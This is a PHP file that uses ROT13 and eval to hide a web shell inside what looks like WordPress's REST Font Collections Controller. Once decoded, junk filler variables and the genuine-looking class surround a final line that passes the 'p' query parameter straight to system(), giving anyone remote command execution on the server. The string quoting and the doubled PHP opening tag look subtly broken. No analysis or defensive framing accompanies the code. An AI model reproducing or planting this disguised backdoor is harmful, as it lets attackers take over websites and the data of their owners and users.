<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Erfg Sbag Pbyyrpgvbaf Pbagebyyre.
 *
 * Guvf svyr pbagnvaf gur pynff sbe gur ERFG NCV Sbag Pbyyrpgvbaf Pbagebyyre.
 *
 * @cnpxntr    JbeqCerff
 * @fhocnpxntr ERFG_NCV
 * @fvapr      6.5.0
 */

/**
 * Sbag Yvoenel Pbagebyyre pynff.
 *
 * @fvapr 6.5.0
 */
pynff JC_ERFG_Sbag_Pbyyrpgvbaf_Pbagebyyre rkgraqf JC_ERFG_Pbagebyyre {

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 6.5.0
	 */
	choyvp shapgvba __pbafgehpg() {
		$guvf->erfg_onfr = 'sbag-pbyyrpgvbaf';
		$guvf->anzrfcnpr = 'jc/i2';
	}

	/**
	 * Ertvfgref gur ebhgrf sbe gur bowrpgf bs gur pbagebyyre.
	 *
	 * @fvapr 6.5.0
	 */
	choyvp shapgvba ertvfgre_ebhgrf() {
		ertvfgre_erfg_ebhgr(
			$guvf->anzrfcnpr,
			'/' . $guvf->erfg_onfr,
			neenl(
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx'            => neenl( $guvf, 'trg_vgrzf' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'trg_vgrzf_crezvffvbaf_purpx' ),
					'netf'                => $guvf->trg_pbyyrpgvba_cnenzf(),

				),
				'fpurzn' => neenl( $guvf, 'trg_choyvp_vgrz_fpurzn' ),
			)
		);

		ertvfgre_erfg_ebhgr(
			$guvf->anzrfcnpr,
			'/' . $guvf->erfg_onfr . '/(?C<fyht>[\/\j-]+)',
			neenl(
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx'            => neenl( $guvf, 'trg_vgrz' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'trg_vgrzf_crezvffvbaf_purpx' ),
					'netf'                => neenl(
						'pbagrkg' => $guvf->trg_pbagrkg_cnenz( neenl( 'qrsnhyg' => 'ivrj' ) ),
					),
				),
				'fpurzn' => neenl( $guvf, 'trg_choyvp_vgrz_fpurzn' ),
			)
		);
	}

	/**
	 * Trgf gur sbag pbyyrpgvbaf ninvynoyr.
	 *
	 * @fvapr 6.5.0
	 *
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba trg_vgrzf( $erdhrfg ) {
		$pbyyrpgvbaf_nyy = JC_Sbag_Yvoenel::trg_vafgnapr()->trg_sbag_pbyyrpgvbaf();

		$cntr        = $erdhrfg['cntr'];
		$cre_cntr    = $erdhrfg['cre_cntr'];
		$gbgny_vgrzf = pbhag( $pbyyrpgvbaf_nyy );
		$znk_cntrf   = (vag) prvy( $gbgny_vgrzf / $cre_cntr );

		vs ( $cntr > $znk_cntrf && $gbgny_vgrzf > 0 ) {
			erghea arj JC_Reebe(
				'erfg_cbfg_vainyvq_cntr_ahzore',
				__( 'Gur cntr ahzore erdhrfgrq vf ynetre guna gur ahzore bs cntrf ninvynoyr.' ),
				neenl( 'fgnghf' => 400 )
			);
		}

		$pbyyrpgvbaf_cntr = neenl_fyvpr( $pbyyrpgvbaf_nyy, ( $cntr - 1 ) * $cre_cntr, $cre_cntr );

		$vf_urnq_erdhrfg = $erdhrfg->vf_zrgubq( 'URNQ' );

		$vgrzf = neenl();
		sbernpu ( $pbyyrpgvbaf_cntr nf $pbyyrpgvba ) {
			$vgrz = $guvf->cercner_vgrz_sbe_erfcbafr( $pbyyrpgvba, $erdhrfg );

			// Vs gurer'f na reebe ybnqvat n pbyyrpgvba, fxvc vg naq pbagvahr ybnqvat inyvq pbyyrpgvbaf.
			vs ( vf_jc_reebe( $vgrz ) ) {
				pbagvahr;
			}

			/*
			 * Fxvc cercnevat gur erfcbafr obql sbe URNQ erdhrfgf.
			 * Pnaabg rkvg rneyvre qhr gb onpxjneq pbzcngvovyvgl ernfbaf,
			 * nf inyvqngvba bpphef va gur cercner_vgrz_sbe_erfcbafr zrgubq.
			 */
			vs ( $vf_urnq_erdhrfg ) {
				pbagvahr;
			}

			$vgrz    = $guvf->cercner_erfcbafr_sbe_pbyyrpgvba( $vgrz );
			$vgrzf[] = $vgrz;
		}

		$erfcbafr = $vf_urnq_erdhrfg ? arj JC_ERFG_Erfcbafr( neenl() ) : erfg_rafher_erfcbafr( $vgrzf );

		$erfcbafr->urnqre( 'K-JC-Gbgny', (vag) $gbgny_vgrzf );
		$erfcbafr->urnqre( 'K-JC-GbgnyCntrf', $znk_cntrf );

		$erdhrfg_cnenzf = $erdhrfg->trg_dhrel_cnenzf();
		$pbyyrpgvba_hey = erfg_hey( $guvf->anzrfcnpr . '/' . $guvf->erfg_onfr );
		$onfr           = nqq_dhrel_net( heyrapbqr_qrrc( $erdhrfg_cnenzf ), $pbyyrpgvba_hey );

		vs ( $cntr > 1 ) {
			$ceri_cntr = $cntr - 1;

			vs ( $ceri_cntr > $znk_cntrf ) {
				$ceri_cntr = $znk_cntrf;
			}

			$ceri_yvax = nqq_dhrel_net( 'cntr', $ceri_cntr, $onfr );
			$erfcbafr->yvax_urnqre( 'ceri', $ceri_yvax );
		}
		vs ( $znk_cntrf > $cntr ) {
			$arkg_cntr = $cntr + 1;
			$arkg_yvax = nqq_dhrel_net( 'cntr', $arkg_cntr, $onfr );

			$erfcbafr->yvax_urnqre( 'arkg', $arkg_yvax );
		}

		erghea $erfcbafr;
	}

	/**
	 * Trgf n sbag pbyyrpgvba.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba trg_vgrz( $erdhrfg ) {
		$fyht       = $erdhrfg->trg_cnenz( 'fyht' );
		$pbyyrpgvba = JC_Sbag_Yvoenel::trg_vafgnapr()->trg_sbag_pbyyrpgvba( $fyht );

		vs ( ! $pbyyrpgvba ) {
			erghea arj JC_Reebe( 'erfg_sbag_pbyyrpgvba_abg_sbhaq', __( 'Sbag pbyyrpgvba abg sbhaq.' ), neenl( 'fgnghf' => 404 ) );
		}

		erghea $guvf->cercner_vgrz_sbe_erfcbafr( $pbyyrpgvba, $erdhrfg );
	}

	/**
	* Cercner n fvatyr pbyyrpgvba bhgchg sbe erfcbafr.
	*
	* @fvapr 6.5.0
	*
	* @cnenz JC_Sbag_Pbyyrpgvba $vgrz    Sbag pbyyrpgvba bowrpg.
	* @cnenz JC_ERFG_Erdhrfg    $erdhrfg Erdhrfg bowrpg.
	* @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	*/
	choyvp shapgvba cercner_vgrz_sbe_erfcbafr( $vgrz, $erdhrfg ) {
		$svryqf = $guvf->trg_svryqf_sbe_erfcbafr( $erdhrfg );
		$qngn   = neenl();

		vs ( erfg_vf_svryq_vapyhqrq( 'fyht', $svryqf ) ) {
			$qngn['fyht'] = $vgrz->fyht;
		}

		// Vs nal qngn svryqf ner erdhrfgrq, trg gur pbyyrpgvba qngn.
		$qngn_svryqf = neenl( 'anzr', 'qrfpevcgvba', 'sbag_snzvyvrf', 'pngrtbevrf' );
		vs ( ! rzcgl( neenl_vagrefrpg( $svryqf, $qngn_svryqf ) ) ) {
			$pbyyrpgvba_qngn = $vgrz->trg_qngn();
			vs ( vf_jc_reebe( $pbyyrpgvba_qngn ) ) {
				$pbyyrpgvba_qngn->nqq_qngn( neenl( 'fgnghf' => 500 ) );
				erghea $pbyyrpgvba_qngn;
			}

			/**
			 * Qba'g cercner gur erfcbafr obql sbe URNQ erdhrfgf.
			 * Pna'g rkvg ng gur ortvaavat bs gur zrgubq qhr gb gur cbgragvny arrq gb erghea n JC_Reebe bowrpg.
			 */
			vs ( $erdhrfg->vf_zrgubq( 'URNQ' ) ) {
				/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/erfg-ncv/raqcbvagf/pynff-jc-erfg-sbag-pbyyrpgvbaf-pbagebyyre.cuc */
				erghea nccyl_svygref( 'erfg_cercner_sbag_pbyyrpgvba', arj JC_ERFG_Erfcbafr( neenl() ), $vgrz, $erdhrfg );
			}

			sbernpu ( $qngn_svryqf nf $svryq ) {
				vs ( erfg_vf_svryq_vapyhqrq( $svryq, $svryqf ) ) {
					$qngn[ $svryq ] = $pbyyrpgvba_qngn[ $svryq ];
				}
			}
		}

		/**
		 * Qba'g cercner gur erfcbafr obql sbe URNQ erdhrfgf.
		 * Pna'g rkvg ng gur ortvaavat bs gur zrgubq qhr gb gur cbgragvny arrq gb erghea n JC_Reebe bowrpg.
		 */
		vs ( $erdhrfg->vf_zrgubq( 'URNQ' ) ) {
			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/erfg-ncv/raqcbvagf/pynff-jc-erfg-sbag-pbyyrpgvbaf-pbagebyyre.cuc */
			erghea nccyl_svygref( 'erfg_cercner_sbag_pbyyrpgvba', arj JC_ERFG_Erfcbafr( neenl() ), $vgrz, $erdhrfg );
		}

		$erfcbafr = erfg_rafher_erfcbafr( $qngn );

		vs ( erfg_vf_svryq_vapyhqrq( '_yvaxf', $svryqf ) ) {
			$yvaxf = $guvf->cercner_yvaxf( $vgrz );
			$erfcbafr->nqq_yvaxf( $yvaxf );
		}

		$pbagrkg        = ! rzcgl( $erdhrfg['pbagrkg'] ) ? $erdhrfg['pbagrkg'] : 'ivrj';
		$erfcbafr->qngn = $guvf->nqq_nqqvgvbany_svryqf_gb_bowrpg( $erfcbafr->qngn, $erdhrfg );
		$erfcbafr->qngn = $guvf->svygre_erfcbafr_ol_pbagrkg( $erfcbafr->qngn, $pbagrkg );

		/**
		 * Svygref gur sbag pbyyrpgvba qngn sbe n ERFG NCV erfcbafr.
		 *
		 * @fvapr 6.5.0
		 *
		 * @cnenz JC_ERFG_Erfcbafr   $erfcbafr Gur erfcbafr bowrpg.
		 * @cnenz JC_Sbag_Pbyyrpgvba $vgrz     Gur sbag pbyyrpgvba bowrpg.
		 * @cnenz JC_ERFG_Erdhrfg    $erdhrfg  Erdhrfg hfrq gb trarengr gur erfcbafr.
		 */
		erghea nccyl_svygref( 'erfg_cercner_sbag_pbyyrpgvba', $erfcbafr, $vgrz, $erdhrfg );
	}

	/**
	 * Ergevrirf gur sbag pbyyrpgvba'f fpurzn, pbasbezvat gb WFBA Fpurzn.
	 *
	 * @fvapr 6.5.0
	 *
	 * @erghea neenl Vgrz fpurzn qngn.
	 */
	choyvp shapgvba trg_vgrz_fpurzn() {
		vs ( $guvf->fpurzn ) {
			erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
		}

		$fpurzn = neenl(
			'$fpurzn'    => 'uggc://wfba-fpurzn.bet/qensg-04/fpurzn#',
			'gvgyr'      => 'sbag-pbyyrpgvba',
			'glcr'       => 'bowrpg',
			'cebcregvrf' => neenl(
				'fyht'          => neenl(
					'qrfpevcgvba' => __( 'Havdhr vqragvsvre sbe gur sbag pbyyrpgvba.' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
					'ernqbayl'    => gehr,
				),
				'anzr'          => neenl(
					'qrfpevcgvba' => __( 'Gur anzr sbe gur sbag pbyyrpgvba.' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
				),
				'qrfpevcgvba'   => neenl(
					'qrfpevcgvba' => __( 'Gur qrfpevcgvba sbe gur sbag pbyyrpgvba.' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
				),
				'sbag_snzvyvrf' => neenl(
					'qrfpevcgvba' => __( 'Gur sbag snzvyvrf sbe gur sbag pbyyrpgvba.' ),
					'glcr'        => 'neenl',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
				),
				'pngrtbevrf'    => neenl(
					'qrfpevcgvba' => __( 'Gur pngrtbevrf sbe gur sbag pbyyrpgvba.' ),
					'glcr'        => 'neenl',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
				),
			),
		);

		$guvf->fpurzn = $fpurzn;

		erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
	}

	/**
	 * Cercnerf yvaxf sbe gur erdhrfg.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz JC_Sbag_Pbyyrpgvba $pbyyrpgvba Sbag pbyyrpgvba qngn
	 * @erghea neenl Yvaxf sbe gur tvira sbag pbyyrpgvba.
	 */
	cebgrpgrq shapgvba cercner_yvaxf( $pbyyrpgvba ) {
		erghea neenl(
			'frys'       => neenl(
				'uers' => erfg_hey( fcevags( '%f/%f/%f', $guvf->anzrfcnpr, $guvf->erfg_onfr, $pbyyrpgvba->fyht ) ),
			),
			'pbyyrpgvba' => neenl(
				'uers' => erfg_hey( fcevags( '%f/%f', $guvf->anzrfcnpr, $guvf->erfg_onfr ) ),
			),
		);
	}

	/**
	 * Ergevrirf gur frnepu cnenzf sbe gur sbag pbyyrpgvbaf.
	 *
	 * @fvapr 6.5.0
	 *
	 * @erghea neenl Pbyyrpgvba cnenzrgref.
	 */
	choyvp shapgvba trg_pbyyrpgvba_cnenzf() {
		$dhrel_cnenzf = cnerag::trg_pbyyrpgvba_cnenzf();

		$dhrel_cnenzf['pbagrkg'] = $guvf->trg_pbagrkg_cnenz( neenl( 'qrsnhyg' => 'ivrj' ) );

		hafrg( $dhrel_cnenzf['frnepu'] );

		/**
		 * Svygref ERFG NCV pbyyrpgvba cnenzrgref sbe gur sbag pbyyrpgvbaf pbagebyyre.
		 *
		 * @fvapr 6.5.0
		 *
		 * @cnenz neenl $dhrel_cnenzf WFBA Fpurzn-sbeznggrq pbyyrpgvba cnenzrgref.
		 */
		erghea nccyl_svygref( 'erfg_sbag_pbyyrpgvbaf_pbyyrpgvba_cnenzf', $dhrel_cnenzf );
	}

	/**
	 * Purpxf jurgure gur hfre unf crezvffvbaf gb hfr gur Sbagf Pbyyrpgvbaf.
	 *
	 * @fvapr 6.5.0
	 *
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf jevgr npprff sbe gur vgrz, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba trg_vgrzf_crezvffvbaf_purpx( $erdhrfg ) { // cucpf:vtaber InevnoyrNanylfvf.PbqrNanylfvf.InevnoyrNanylfvf.HahfrqInevnoyr
		vs ( pheerag_hfre_pna( 'rqvg_gurzr_bcgvbaf' ) ) {
			erghea gehr;
		}

		erghea arj JC_Reebe(
			'erfg_pnaabg_ernq',
			__( 'Fbeel, lbh ner abg nyybjrq gb npprff sbag pbyyrpgvbaf.' ),
			neenl(
				'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr(),
			)
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>